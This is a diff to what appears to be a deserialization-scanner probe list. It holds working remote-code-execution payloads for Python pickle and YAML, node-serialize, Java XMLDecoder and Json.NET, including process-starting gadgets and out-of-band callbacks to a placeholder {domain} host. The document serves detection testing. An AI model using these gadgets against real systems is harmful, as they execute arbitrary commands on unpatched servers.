@@ -83,8 +83,8 @@ new URL('http://{domain}/groovy').text
 Y19fYnVpbHRpbl9fCmV2YWwKKFMnMS8wJwp0Ui4=
 ##Python Pickle P0 - Math (eval 7*191)##
 Y19fYnVpbHRpbl9fCmV2YWwKKFMnNyoxOTEnCnRSLg==
-##Python Pickle P0 - Timing (sleep 5)##
-Y29zCnN5c3RlbQooUydzbGVlcCA1Jwp0Ui4=
+##Python Pickle P0 - Timing (time.sleep 5)##
+Y3RpbWUKc2xlZXAKKEk1CnRSLg==
 ##Python Pickle P0 - OOB urllib##
 Y19fYnVpbHRpbl9fCmV2YWwKKFMnX19pbXBvcnRfXygidXJsbGliLnJlcXVlc3QiKS5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97ZG9tYWlufS9waWNrbGUiKScKdFIu
 ##Python YAML - Error (1/0)##
@@ -92,7 +92,7 @@ Y19fYnVpbHRpbl9fCmV2YWwKKFMnX19pbXBvcnRfXygidXJsbGliLnJlcXVlc3QiKS5yZXF1ZXN0LnVy
 ##Python YAML - Math (eval 7*191)##
 !!python/object/apply:builtins.eval ["7*191"]
 ##Python YAML - Timing (sleep 5)##
-!!python/object/apply:os.system ["sleep 5"]
+!!python/object/apply:time.sleep [5]
 ##Python YAML - OOB urllib##
 !!python/object/apply:builtins.exec ["import urllib.request;urllib.request.urlopen('http://{domain}/yaml')"]
 ##Python jsonpickle - Error (1/0)##
@@ -108,13 +108,13 @@ Y19fYnVpbHRpbl9fCmV2YWwKKFMnX19pbXBvcnRfXygidXJsbGliLnJlcXVlc3QiKS5yZXF1ZXN0LnVy
 ##Node node-serialize - Math (return 7*191)##
 {"rce":"_$$ND_FUNC$$_function(){return 7*191}()"}
 ##Node node-serialize - Timing (sleep 5)##
-{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('sleep 5')}()"}
+{"rce":"_$$ND_FUNC$$_function(){var d=Date.now()+5000;while(Date.now()<d){}}()"}
 ##Node node-serialize - OOB http.get##
 {"rce":"_$$ND_FUNC$$_function(){require('http').get('http://{domain}/nodeser')}()"}
 ##Node js-yaml - Error (unknown tag)##
 !!invalid_tag_probe 1337
 ##Node funcster - Error (invalid code)##
-{"__js":"throw new Error(1337)"}
+{"fn":{"__js_function":"function(){return 7*191}"}}
 ##PHP Unserialize - Error (nonexistent class)##
 O:9999:"NonExist":0:{}
 ##Ruby YAML - Error (invalid class)##
@@ -139,8 +139,8 @@ rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA==
 <java.lang.ProcessBuilder><command><string>nslookup</string><string>{domain}</string></command></java.lang.ProcessBuilder>
 ##XMLDecoder - Error (invalid class)##
 <java version="1.8.0" class="java.beans.XMLDecoder"><object class="com.nonexistent.Fake1337"/></java>
-##XMLDecoder - Math (echo 1337)##
-<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/sh</string></void><void index="1"><string>-c</string></void><void index="2"><string>echo 1337</string></void></array><void method="start"/></object></java>
+##XMLDecoder - Math (expr 7*191)##
+<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/sh</string></void><void index="1"><string>-c</string></void><void index="2"><string>expr 7 \* 191</string></void></array><void method="start"/></object></java>
 ##XMLDecoder - Timing (sleep 5)##
 <java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.Thread" method="sleep"><long>5000</long></object></java>
 ##XMLDecoder - OOB URL.openStream##
@@ -149,8 +149,8 @@ rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA==
 C_hessianRldap://{domain}/a
 ##.NET Json.NET - OOB (nslookup)##
 {"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"nslookup","Arguments":"{domain}"}}}
-##.NET Json.NET - Math (echo 1337)##
-{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c echo 1337"}}}
+##.NET Json.NET - Math (set /a 7*191)##
+{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c set /a 7*191"}}}
 ##.NET Json.NET - Timing (timeout 5)##
 {"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c timeout 5"}}}
 ##.NET BinaryFormatter - Error (header probe)##
